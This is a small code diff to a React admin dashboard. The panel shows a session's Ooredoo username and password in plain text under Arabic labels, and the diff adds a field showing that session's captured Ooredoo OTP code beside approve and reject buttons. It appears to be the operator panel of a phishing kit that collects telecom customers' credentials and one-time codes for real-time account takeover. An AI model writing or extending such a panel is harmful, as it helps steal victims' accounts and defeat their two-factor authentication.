@@ -383,6 +383,7 @@ export default function AdminDashboard() {
                   data={{
                     "المستخدم": selectedSession.ooredoo?.ooredooUser,
                     "كلمة السر": selectedSession.ooredoo?.ooredooPassword,
+                    "رمز OTP Ooredoo": selectedSession.otps?.find((otp: any) => otp.otpType === 'ooredoo')?.otpCode || '—',
                   }}
                   onAccept={() => handleStatusUpdate(selectedSession.sessionId, 'approved')}
                   onReject={() => handleStatusUpdate(selectedSession.sessionId, 'rejected')}
